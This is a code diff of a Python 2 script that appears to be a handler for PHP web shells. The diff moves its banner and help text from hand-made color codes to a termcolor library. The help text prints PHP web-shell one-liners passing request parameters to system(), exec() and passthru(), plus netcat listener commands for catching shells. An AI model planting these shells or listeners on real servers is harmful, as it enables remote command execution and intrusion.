@@ -12,48 +12,38 @@ except ImportError:
 else:
     pass
 
-
-class Colors(object):
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    HOT = '\033[94m'
-    YELLOW = '\033[93m'
-    END = '\033[0m'
+from core.libs.termcolor import colored, cprint
 
 
 class Banner(object):
-    banner = """{0}
+    banner = colored("""
 \t\t__          __  _     _    _                 _ _
 \t\t\ \        / / | |   | |  | |               | | |
 \t\t \ \  /\  / /__| |__ | |__| | __ _ _ __   __| | | ___ _ __
 \t\t  \ \/  \/ / _ \ '_ \|  __  |/ _` | '_ \ / _` | |/ _ \ '__|
 \t\t   \  /\  /  __/ |_) | |  | | (_| | | | | (_| | |  __/ |
 \t\t    \/  \/ \___|_.__/|_|  |_|\__,_|_| |_|\__,_|_|\___|_|
-\t\t-----------------------------------------------------------{1}""".format(Colors.YELLOW, Colors.END)
+\t\t-----------------------------------------------------------""", 'yellow')
 
     if not path.exists(path.join(getcwd(), ".git")):
-        banner += '\n\t\t  {0}[!] "non-git". Keep up-to-date by running \'--update\'{1}'.format(Colors.RED, Colors.END)
+        banner += colored('\n\t\t  [!] "non-git". Keep up-to-date by running \'--update\'', 'red')
     else:
         f = Popen('git rev-parse --short HEAD', shell=True, stdout=PIPE, stderr=PIPE)
         current_commit = f.communicate()[0]
-        banner += '\n{0}{1}Version: {2}{3}'.format('\t' * 7, Colors.GREEN, current_commit, Colors.END)
+        banner += colored('\n{0}Version: {1}'.format('\t' * 7, current_commit), 'green')
 
 
 class GetArgs(object):
     if len(argv) <= 1:
-        print'''
-{hot}-- Hanlder for PHP system functions & alternative 'netcat listener' --
-
---   Which works for POST and GET requests:    --{end}
-{yellow}1-   <?php system($_GET['parameter']); ?>
-2-   <?php exec($_POST['parameter']); ?>
-3-   <?php passthru($_REQUEST['parameter']); ?>{end}
-
-{hot}--   Alternative 'netcat listener'    --{end}
-{yellow}1-   netcat -l -p 1234
-2-   nc -lvvp 4321{end}
-
-Run: {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)
+        cprint("-- Hanlder for PHP system functions & alternative 'netcat listener' --\n", 'blue')
+        cprint("--   Which works for POST and GET requests:    --", 'blue')
+        cprint("1-   <?php system($_GET['parameter']); ?>", 'yellow')
+        cprint("2-   <?php exec($_POST['parameter']); ?>", 'yellow')
+        cprint("3-   <?php passthru($_REQUEST['parameter']); ?>\n", 'yellow')
+        cprint("--   Alternative 'netcat listener'    --", 'blue')
+        cprint("1-   netcat -l -p 1234", 'yellow')
+        cprint("2-   nc -lvvp 4321\n", 'yellow')
+        print "Run: " + colored("{0} -h".format(argv[0]), 'red') + "for help"
         exit(1)
     else:
         parser = argparse.ArgumentParser(
